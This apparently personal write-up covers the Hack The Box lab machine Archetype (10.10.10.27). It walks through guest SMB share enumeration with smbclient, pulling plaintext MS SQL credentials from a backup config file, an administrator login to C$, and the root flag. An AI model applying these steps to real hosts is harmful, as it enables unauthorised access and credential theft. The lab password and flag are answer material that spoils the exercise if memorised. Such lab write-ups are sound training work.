# Archetype (10.10.10.27) SMB
#archetype
## Summary
- Found root flag
- Found sql_svc credentials
## Procedure
1. List
	```
	tyler@tyler-ops:~$ smbclient -L 10.10.10.27
	Enter WORKGROUP\tyler's password: <empty>
	
		Sharename       Type      Comment
		---------       ----      -------
		ADMIN$          Disk      Remote Admin
		backups         Disk
		C$              Disk      Default share
		IPC$            IPC       Remote IPC
	SMB1 disabled -- no workgroup available
	```
	![[Pasted image 20210816141309.png]]
2. //10.10.10.27/backups/
	```
	tyler@tyler-ops:~$ smbclient //10.10.10.27/backups
	Enter WORKGROUP\tyler's password: <empty>
	Try "help" to get a list of possible commands.
	smb: \> ls
	  .                                   D        0  Mon Jan 20 04:20:57 2020
	  ..                                  D        0  Mon Jan 20 04:20:57 2020
	  prod.dtsConfig                     AR      609  Mon Jan 20 04:23:02 2020

					10328063 blocks of size 4096. 8258776 blocks available
	```
	![[Pasted image 20210816141648.png]]
	- Also reachable with sql_svc account
3. //10.10.10.27/backups/prod.dtsConfig
		- Extracted MS SQL credentials:
			- User: `ARCHETYPE\sql_svc`
			- Pass: `M3g4c0rp123`
	```
	<ConfiguredValue>
	Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;	
	</ConfiguredValue>
	```
	![[Pasted image 20210816144800.png]]
4. //10.10.10.27/ADMIN$/
	- Inaccessible with guest account
5. //10.10.10.27/C$/
	- Inaccessible with guest account
6. //10.10.10.27/IPC$/
	- Empty with guest account
	- Empty with sql_svc account
7. //10.10.10.27/C$/
	```
	tyler@ubuntu:~/Documents/learn/htb/htb-starting-point$ smbclient -W ARCHTYPE -U administrator \\\\10.10.10.27\\C$
	Enter ARCHTYPE\administrator's password:
	Try "help" to get a list of possible commands.
	smb: \> ls
	  backups                             D        0  Mon Jan 20 04:20:57 2020
	  Documents and Settings            DHS        0  Sun Jan 19 22:39:33 2020
	  pagefile.sys                      AHS 402653184  Tue Aug 17 08:05:37 2021
	  PerfLogs                            D        0  Sat Sep 15 00:12:32 2018
	  Program Files                      DR        0  Sun Jan 19 15:09:15 2020
	  Program Files (x86)                 D        0  Sun Jan 19 15:08:49 2020
	  ProgramData                        DH        0  Sun Jan 19 22:49:11 2020
	  Recovery                          DHS        0  Sun Jan 19 22:39:33 2020
	  System Volume Information         DHS        0  Sun Jan 19 22:38:58 2020
	  Users                              DR        0  Sun Jan 19 22:39:46 2020
	  Windows                             D        0  Sun Jan 19 15:08:24 2020

					10328063 blocks of size 4096. 8247829 blocks available
	smb: \>
	```
	![[Pasted image 20210817075007.png]]
	- Logged in with administrator account
8. //10.10.10.27/C$/Users/Administrator/Desktop/root.txt
	- Found root.txt which contains root flag
	- root flag: `b91ccec3305e98240082d4474b848528`
